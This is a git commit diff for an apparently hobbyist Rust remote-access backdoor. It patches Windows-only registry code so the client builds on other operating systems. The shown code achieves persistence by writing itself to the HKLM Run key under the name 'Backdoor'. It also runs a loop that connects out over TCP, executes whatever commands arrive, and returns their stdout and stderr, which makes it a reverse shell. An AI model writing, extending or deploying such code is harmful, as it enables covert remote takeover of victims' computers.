3b5d8829c5603ebf944c3cb049a014cc167c8472
ranon rat <66473662+ranon-rat@users.noreply.github.com>
2021-07-17 02:21:44 -0500

    soporte para multiples sistemas operativos
    me estaba dando error la dependencia `winreg` por que solo es para windows asi que lo modifique un poco

--- client/src/backdoor/infect.rs
+++ client/src/backdoor/infect.rs
@@ -1,40 +1,55 @@
+#[cfg(target_os = "windows")]
 extern crate winreg;
 
-use std::path::{PathBuf, Path};
-use std::env::{current_exe, consts::OS};
+use std::env::{consts::OS, current_exe};
+use std::path::{Path, PathBuf};
+#[cfg(target_os = "windows")]
 use winreg::enums::*;
+#[cfg(target_os = "windows")]
 use winreg::RegKey;
 
-fn infect_pc(){
+fn infect_pc() {
     let current_path: PathBuf = current_exe().unwrap();
-    match OS{
-        "windows" => {
+    match OS {
+        "windows" =>{
+        
+            #[cfg(target_os = "windows")]
             let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
             let path = Path::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
+            #[cfg(target_os = "windows")]
             let (key, disp) = hklm.create_subkey(&path).unwrap();
-        
+            #[cfg(target_os = "windows")]
             match disp {
                 REG_CREATED_NEW_KEY => println!("A new key has been created"),
                 REG_OPENED_EXISTING_KEY => println!("An existing key has been opened"),
             }
+            #[cfg(target_os = "windows")]
+            let _ = key.set_value(
+                "Backdoor",
+                &current_path.into_os_string().into_string().unwrap(),
+            );}
         
-            let _ = key.set_value("Backdoor", &current_path.into_os_string().into_string().unwrap());
-
-    },
         "linux" => (),
         "macos" => (),
         _ => {}
     }
 }
 
-fn check_infection() -> bool{
-    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
-    let path = Path::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor");
+#[cfg(target_os = "windows")]
+fn check_infection() -> bool {
+    
 
-    if hklm.open_subkey(&path).is_err(){ return false; } 
-    return true;
+        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
+        let path = Path::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor");
+
+        if hklm.open_subkey(&path).is_err() {
+            return false;
+        }
+    true
 }
-
-pub fn start_infection(){
-    if !check_infection(){ infect_pc(); }
+#[cfg(target_os = "windows")]
+pub fn start_infection() {
+    if !check_infection() {
+        infect_pc();
+    }
 }
--- client/src/main.rs
+++ client/src/main.rs
@@ -3,34 +3,35 @@ use std::net::TcpStream;
 use std::str::from_utf8;
 mod backdoor;
 
-
 fn main() -> std::io::Result<()> {
-    backdoor::infect::start_infection();
-    let mut stream: TcpStream = backdoor::start_connection::establish_connection(10);
+   // backdoor::infect::start_infection();
     loop {
-        let mut data = [0; 1024];// hay que tener esto para manejar una gran cantidad de datos , con 6 bytes no basta ya que solo te da una salida de 6 caracteres
-        match stream.read(&mut data) {
-            Ok(_) => {
+        let mut stream: TcpStream = backdoor::start_connection::establish_connection(10);
+        loop {
+            let mut data = [0; 1024]; // hay que tener esto para manejar una gran cantidad de datos , con 6 bytes no basta ya que solo te da una salida de 6 caracteres
+            match stream.read(&mut data) {
+                Ok(_) => {
+                    let command = String::from_utf8(from_utf8(&data).unwrap().as_bytes().to_vec())
+                        .expect("Found invalid UTF-8");
+                    let command = command.trim_matches(char::from(0));
 
-                let command = String::from_utf8(from_utf8(&data).unwrap().as_bytes().to_vec()).expect("Found invalid UTF-8");
-                let command = command.trim_matches(char::from(0));
+                    let result = backdoor::execute_depending_of_os::execute_command(command);
 
-                let result = backdoor::execute_depending_of_os::execute_command(command);
-                
-                if result.is_ok(){
-                    let mut r = result.unwrap();
+                    if result.is_ok() {
+                        let mut r = result.unwrap();
 
-                    let result_vec = &mut r.stdout;
-                    result_vec.push(10); // inserta /n para que el stdout y el stderr no se vea todo junto
-                    result_vec.append(&mut r.stderr);
+                        let result_vec = &mut r.stdout;
+                        result_vec.push(10); // inserta /n para que el stdout y el stderr no se vea todo junto
+                        result_vec.append(&mut r.stderr);
 
-                    let t_s = &result_vec.as_slice()[..];
-                    stream.write(t_s).unwrap();
+                        let t_s = &result_vec.as_slice()[..];
+                        stream.write(t_s).unwrap();
+                    }
+                    stream.flush().unwrap();
+                    ()
                 }
-                stream.flush().unwrap();
-                ()
+                Err(_) => (),
             }
-            Err(_) => (),
         }
     }
 }
